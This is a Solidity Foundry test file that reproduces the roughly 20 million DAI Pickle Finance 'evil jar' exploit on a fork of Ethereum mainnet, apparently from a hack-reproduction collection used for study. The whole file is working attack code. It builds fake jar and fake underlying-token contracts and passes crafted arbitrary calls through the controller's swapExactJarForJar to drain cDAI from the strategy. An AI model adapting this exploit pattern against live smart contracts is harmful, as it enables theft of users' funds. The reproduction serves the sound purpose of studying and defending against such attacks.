// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : around 20 million DAI.
// Attacker : 0xbac8a476b95ec741e56561a66231f92bc88bb3a8
// AttackContract : 0x2b0b02ce19c322b4dd55a3949b4fb6e9377f7913#code
// Attack TX: https://etherscan.io/tx/0xe72d4e7ba9b5af0cf2a8cfb1e30fd9f388df0ab3da79790be842bfbed11087b0
// Attack TX: https://ethtx.info/mainnet/0xe72d4e7ba9b5af0cf2a8cfb1e30fd9f388df0ab3da79790be842bfbed11087b0
// Exploit code refers to sam. https://github.com/banteg/evil-jar/blob/master/reference/samczsun.sol

CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
ControllerLike constant CONTROLLER = ControllerLike(0x6847259b2B3A4c17e7c43C54409810aF48bA5210);
CurveLogicLike constant CURVE_LOGIC = CurveLogicLike(0x6186E99D9CFb05E1Fdf1b442178806E81da21dD8);

IERC20 constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
IERC20 constant CDAI = IERC20(0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643);

JarLike constant PDAI = JarLike(0x6949Bb624E8e8A90F87cD2058139fcd77D2F3F87);
address constant STRAT = 0xCd892a97951d46615484359355e3Ed88131f829D;

contract AttackContract is Test {
    address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    function setUp() public {
        cheat.createSelectFork("mainnet", 11_303_122); // Fork mainnet at block 11303122
    }

    function testExploit() public {
        uint256 earns = 5;

        address[] memory targets = new address[](earns + 2);
        bytes[] memory datas = new bytes[](earns + 2);
        for (uint256 i = 0; i < earns + 2; i++) {
            targets[i] = address(CURVE_LOGIC);
        }
        datas[0] = arbitraryCall(STRAT, "withdrawAll()");
        for (uint256 i = 0; i < earns; i++) {
            datas[i + 1] = arbitraryCall(address(PDAI), "earn()");
        }
        datas[earns + 1] = arbitraryCall(STRAT, "withdraw(address)", address(CDAI));

        emit log_named_decimal_uint("Before exploiting, Attacker cDAI Balance", CDAI.balanceOf(address(msg.sender)), 8);

        console.log("DAI balance on pDAI", DAI.balanceOf(address(PDAI)));

        CONTROLLER.swapExactJarForJar(address(new FakeJar(CDAI)), address(new FakeJar(CDAI)), 0, 0, targets, datas);

        emit log_named_decimal_uint("After exploiting, Attacker cDAI Balance", CDAI.balanceOf(address(msg.sender)), 8);
    }

    function arbitraryCall(address to, string memory sig) internal returns (bytes memory) {
        return abi.encodeWithSelector(
            CURVE_LOGIC.add_liquidity.selector, to, bytes4(keccak256(bytes(sig))), 1, 0, address(CDAI)
        );
    }

    function arbitraryCall(address to, string memory sig, address param) internal returns (bytes memory) {
        return abi.encodeWithSelector(
            CURVE_LOGIC.add_liquidity.selector, to, bytes4(keccak256(bytes(sig))), 1, 0, new FakeUnderlying(param)
        );
    }

    receive() external payable {}
}

abstract contract ControllerLike {
    function swapExactJarForJar(
        address _fromJar, // From which Jar
        address _toJar, // To which Jar
        uint256 _fromJarAmount, // How much jar tokens to swap
        uint256 _toJarMinAmount, // How much jar tokens you'd like at a minimum
        address[] calldata _targets,
        bytes[] calldata _data
    ) external virtual;
}

abstract contract CurveLogicLike {
    function add_liquidity(
        address curve,
        bytes4 curveFunctionSig,
        uint256 curvePoolSize,
        uint256 curveUnderlyingIndex,
        address underlying
    ) public virtual;
}

contract FakeJar {
    IERC20 _token;

    constructor(IERC20 token) public {
        _token = token;
    }

    function token() public view returns (IERC20) {
        return _token;
    }

    function transfer(address to, uint256 amnt) public returns (bool) {
        return true;
    }

    function transferFrom(address, address, uint256) public returns (bool) {
        return true;
    }

    function getRatio() public returns (uint256) {
        return 0;
    }

    function decimals() public returns (uint256) {
        return 0;
    }

    function balanceOf(address) public returns (uint256) {
        return 0;
    }

    function approve(address, uint256) public returns (bool) {
        return true;
    }

    function deposit(uint256 amount) public {
        _token.transferFrom(msg.sender, tx.origin, amount);
    }

    function withdraw(uint256) public {}
}

contract FakeUnderlying {
    address private target;

    constructor(address _target) public {
        target = _target;
    }

    function balanceOf(address) public returns (address) {
        return target;
    }

    function approve(address, uint256) public returns (bool) {
        return true;
    }

    function allowance(address, address) public returns (uint256) {
        return 0;
    }
}

abstract contract JarLike {
    function earn() public virtual;
}
